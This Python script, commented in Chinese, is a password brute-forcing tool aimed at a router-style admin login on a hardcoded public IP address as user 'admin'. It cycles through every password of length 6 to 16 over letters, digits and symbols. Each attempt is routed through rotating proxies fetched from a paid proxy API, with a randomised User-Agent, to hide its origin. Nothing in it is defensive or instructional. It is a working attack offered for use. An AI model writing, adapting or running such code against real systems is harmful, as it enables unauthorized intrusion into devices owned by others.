import requests
import itertools
import time
import random
import fake_useragent
import re

# 访问测试
# url = "http://192.16
# 8.1.1/"
# r = requests.get(url)
# print("状态码：",r)
# print("网页内容：",r.text)

# 装饰器 计算时间
def time_out(a_func):
    def clocked(*args, **kwargs):
        start = time.time()
        result = a_func(*args, **kwargs)
        end = time.time()
        print("程序：" + a_func.__name__,"    运行时间：" + str(end - start))
        return result
    return clocked

# 00ip代理
def ip_out():
    url = "http://proxy.httpdaili.com/apinew.asp?sl=3&noinfo=true&text=1&ddbh=1420927609453534893"
    r = requests.get(url)
    print("代理ip状态码：", r.status_code)
    t = r.text
    # 正则匹配ip段and端口号
    ips = re.findall(r'[0-9]+(?:\.[0-9])+.+[0-9]{3}', t)
    # print(ips)
    proxy = {'http': ips[0]}
    print("当前代理ip地址为：",proxy)

    return proxy

# 使用加密后的密码开始登陆路由器后台
def login(user,password):
    ip = ip_out()
    # 实例化 user-agent 对象
    ua = fake_useragent.UserAgent()
    dict_1 = {"User-Agents":ua.random,"isOF": 1, "txtUserName":user,"txtPwd":password}

    # requests.get('http://183.230.147.88:8081/',proxies=ip )# headers={'Content-Type': 'application/json'}
    r = requests.post('http://183.230.147.88:8081/Ajax/UserLogin.ashx',data=dict_1,proxies=ip)

    code = r.text
    if code == "password error":
        print('登陆返回值：', code, "密码错误，继续尝试登陆.......")
        # print(r.text)
    else:
        print('登陆返回值：', code, "密码正确，登陆成功！！！！！！！")
    return code
# 密码字典  生成密码
@time_out
def num_z_Z_symbol(a=5,count=0):
    time_sleep = random.random()
    """
    我认为的所有密码：
    数字 + 小写字母 + 大写字母 + 符号
    :return:
    """
    chars = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&*?_-."
    with open('./try错过的密码.txt','a+',encoding='utf-8') as f:

        for i in range(6, 17):  # 密码长度  从5位数开始  16位数密码结束
            for c in itertools.product(chars, repeat=i):
                count += 1
                password = ''.join(c)
                print('*************** 第 ' + str(count) + ' 组密码 ***************')
                print(password)
                try:
                    if login(user,password) != "password error":
                        print("密码破解成功，程序退出！")
                        break
                    else:
                        pass
                except:
                    f.write(password+r'\n')
                    print(password,'已写入...错过的密码.txt')
                    f.close()
                    continue
                # if count % 50 == 0 :
                #     time.sleep(5)
                #     print("每50次尝试密码后，暂停5秒")


if __name__ == '__main__':
    user = 'admin'
    # 开始破解
    num_z_Z_symbol()
    # 测试ip代理
    # ip_out()